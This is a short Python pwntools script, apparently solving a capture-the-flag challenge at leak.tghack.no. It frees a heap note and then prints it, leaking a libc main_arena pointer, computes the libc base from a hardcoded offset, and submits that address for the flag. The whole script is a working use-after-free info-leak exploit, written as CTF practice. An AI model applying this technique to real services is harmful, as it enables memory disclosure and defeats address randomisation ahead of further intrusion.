from pwn import *

def new_note(size):
    r.sendline("1")
    r.recvuntil("size: ")
    r.sendline(str(size))
    r.sendline("A" * (size - 2))
    r.recvuntil("$ ")

def del_note(num):
    # 2. Delete note
    r.sendline("2")
    r.sendline(str(num))
    r.recvuntil("$ ")

def print_note(num):
    # 3. Print note
    r.sendline("3")
    r.sendline(str(num))
    r.recvuntil("Note number: ")
    return r.recvuntil("$ ")

def get_flag(addr):
    # 4. Get flag
    r.sendline("4")
    r.sendline(hex(addr))
    print r.recvuntil("}")

r = remote("leak.tghack.no", 3190)
r.recvuntil("$ ")

#off = 0x39bb58
# main_arena+88
off = 0x3c3b78

# 1. Add note
new_note(128)
new_note(128)
del_note(0)
leak = print_note(0).strip("\n")
leak = u64(leak[:6].ljust(8, "\x00"))
log.info("leaked addr: {}".format(hex(leak)))
log.info("libc base: {}".format(hex(leak - off)))

log.info("Sending addr {}".format(hex(leak - off)))
get_flag(leak - off)

r.sendline("5")
